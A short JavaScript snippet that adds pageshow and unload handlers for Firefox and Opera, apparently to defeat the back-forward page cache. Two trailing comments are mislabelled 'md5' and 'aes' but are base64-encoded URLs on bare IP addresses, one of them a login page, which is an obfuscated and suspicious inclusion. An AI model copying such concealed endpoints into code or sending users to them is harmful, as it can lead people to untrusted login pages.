if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzEyMC43Ny44LjE4NTo4MDA4L3dhcC8jL2xvZ2luMj92PTM=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/